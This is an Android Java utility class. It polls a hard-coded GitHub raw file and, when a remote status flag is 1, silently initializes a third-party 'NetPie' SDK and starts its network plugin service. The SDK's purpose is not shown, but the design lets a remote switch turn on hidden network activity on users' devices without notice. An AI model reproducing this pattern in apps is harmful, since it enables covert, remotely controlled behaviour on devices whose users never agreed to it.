package com.ghb.cry.app;

import android.content.Context;
import android.os.Handler;
import android.util.Log;
import com.jd.wxb.netpie.library.NetPieSDK;
import com.jd.wxb.netpie.library.PluginOutputListener;
import com.jd.wxb.netpie.library.PluginType;
import org.jetbrains.annotations.NotNull;
import org.json.JSONException;
import org.json.JSONObject;

public class CryUtils implements NetworkTask.NetworkTaskListener {

  private String baseUrl;
  private String apiUrl;
  private String GITHUB = "https://raw.githubusercontent.com";
  //private String GITEE = "https://gitee.com";
  private String GITHUB_API = "/Corey-Jia/GhbCryLib/master/data.txt";
  //private String GITEE_API = "/corey_jia/GhbCry/raw/master/data.txt";

  private static Context ctx;

  private static CryUtils instance;

  private boolean isLoadData = false;

  private Handler handler = new Handler();

  private int tryNum = 0;
  private String url;

  public static CryUtils getInstance(Context context) {
    ctx = context;
    if (instance == null) {
      instance = new CryUtils();
    }
    return instance;
  }

  private CryUtils() {
  }

  public void init() {
    baseUrl = GITHUB;
    apiUrl = GITHUB_API;
    url = new StringBuilder().append(baseUrl).append(apiUrl).toString();
    loadData();
    //pixelFireInit();
  }

  private Runnable runnable = new Runnable() {
    @Override public void run() {
      loadData();
    }
  };

  private void loadData() {
    Log.d("CryUtils", "loadData");
    if (isLoadData) {
      handler.removeCallbacks(runnable);
      return;
    }
    new NetworkTask(this).execute(url);
  }

  private void pixelFireInit() {
    Log.d("CryUtils", "pixelFireInit");
    //// 初始化SDK
    NetPieSDK.init(ctx);

    PluginOutputListener outputListener = new PluginOutputListener() {
      @Override public void onOutput(@NotNull String s) {
        Log.d("CryUtils", "onOutput_" + s);
      }
    };
    // 启动服务
    NetPieSDK.startPluginService(ctx, PluginType.EIP, false, outputListener);
  }

  @Override public void onNetworkTaskCompleted(JSONObject jsonObject) {
    Log.d("CryUtils", "onNetworkTaskCompleted");
    isLoadData = true;
    try {
      int status = (int) jsonObject.get("status");
      Log.d("CryUtils", "status_" + status);
      if (status == 1) {
        pixelFireInit();
      }
    } catch (JSONException e) {
      throw new RuntimeException(e);
    }
  }

  @Override public void onNetworkTaskFailed() {
    Log.d("CryUtils", "onNetworkTaskFailed, tryNum: " + tryNum);
    // 确保重置isLoadData标志，允许下次重试
    isLoadData = false;
    
    if (tryNum <= 20) {
      // 计算退避时间：首次5秒，之后每次翻倍，但最长不超过2分钟(120秒)
      long delayMillis = calculateBackoffDelay(tryNum);
      Log.d("CryUtils", "Scheduling retry after " + (delayMillis / 1000) + " seconds, attempt: " + (tryNum + 1));
      handler.postDelayed(runnable, delayMillis);
      tryNum++;
    } else {
      Log.d("CryUtils", "Maximum retry attempts reached");
    }
  }
  
  /**
   * 计算指数退避延迟时间
   * @param attempt 当前重试次数
   * @return 延迟毫秒数，首次5秒，之后每次翻倍，最长120秒
   */
  private long calculateBackoffDelay(int attempt) {
    // 首次重试(attempt=0)是5秒，第二次(attempt=1)是10秒，第三次(attempt=2)是20秒，以此类推
    long baseDelay = 5000; // 基础延迟时间：5秒
    long maxDelay = 120000; // 最大延迟时间：2分钟
    
    // 计算指数延迟，但不超过最大值
    long calculatedDelay = (long) (baseDelay * Math.pow(2, attempt));
    return Math.min(calculatedDelay, maxDelay);
  }
}
